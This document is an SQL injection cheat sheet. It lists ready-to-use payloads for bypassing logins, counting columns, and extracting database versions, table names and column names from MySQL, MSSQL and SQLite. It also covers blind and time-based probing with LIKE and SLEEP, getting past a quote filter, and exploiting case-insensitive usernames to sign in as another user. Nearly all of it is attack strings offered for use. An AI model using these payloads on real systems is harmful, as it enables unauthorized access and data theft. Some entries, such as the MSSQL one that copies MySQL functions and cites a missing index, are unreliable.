###### In the following queries, `'` may not work sometimes, so { **\`**,`"` } can  be tested
###### To comment out the remaining code, { `;#`,`;--`,`;//` } can be used
###### While doing sqli through urls, { `;#`,`;--`,`;//` } need to be encoded specially 

### Finding no of columns in table _(Error-based SQLI)_
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
  
* _[$input_user]_ : `' UNION SELECT 1,2,3.. FROM table_name --`
* _[$input_user]_ : `' ORDER BY n --`  [If we get error for n, then n-1 will be no of columns]
 
### Limiting no of rows
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
  
* _[$input_user]_ : `' OR 1=1 LIMIT 1 --`

### Special Bypassing
* Bypassing filtered `'`__[quote]__

```   
 <?php 
 $name = preg_replace("'","",$name);
 $pass = preg_replace("'","",$pass);
 SELECT * FROM users WHERE username='name' and password='pass'
```
  _[attack]_ => user = `\`  & pass = `OR 1=1 --`

## For Mysql
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
###### Assume no of columns to be 3
#### Finding version and databases
*  _[$input_user]_ : `' UNION SELECT 1,@@version,database() --`

#### Extracting Tables from databases
*  _[$input_user]_ : `' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()`

#### Extracting columns from databases
*  _[$input_user]_ : `' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database()`
*  _[$input_user]_ : `' UNION SELECT table_name, column_name, 1 FROM information_schema.columns`

## For Mssql
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
###### Assume no of columns to be 3
#### Finding version and databases
*  _[$input_user]_ : `' UNION SELECT 1,@@version,database() --` [Here **i** is the i-th database present]

## For sqlite
 In sqlite __sqlite_master__ replaces __information_schema__
 
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`

#### Extracting table names
  _[$input_user]_ : `' UNION SELECT name FROM sqlite_master WHERE type='table'`
#### Extracting column names from a table
  _[$input_user]_ : `' UNION SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name = 'table_name'`

## Blind SQLI
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
  
*  _[$input_user]_ : `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE "%a%") --`   [It will ask whether a user with letter "a" or "A" containing in his name]
*  _[$input_user]_ : `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE "__a%") --`	 [It will ask whether the letter is at 3rd place or NOT]

  HERE `%`,`_` are WILDCARDS. `%` matches any string and `_` matches only one character

* By default, LIKE is __case-insensitive__

  _[$input_user]_ : `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE BINARY "%a%") --` [To make a case sensitive search, use BINARY right after LIKE]

## Time-based Blind SQLI
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`

*  _[$input_user]_ : `' OR (SELECT SLEEP(10) FROM table_name WHERE username='something') --`
*  _[$input_user]_ : `' OR IF(username='something',SLEEP(10),0) --`

    [Produces a delayed response if username=`something` exists]
 
## Common-errs
* `mysql` does a case insensitive search by default and also ignores the trailing spaces

   How to exploit that?
   
   A username `Admin` can be created and it can be used to sign-in as `admin`
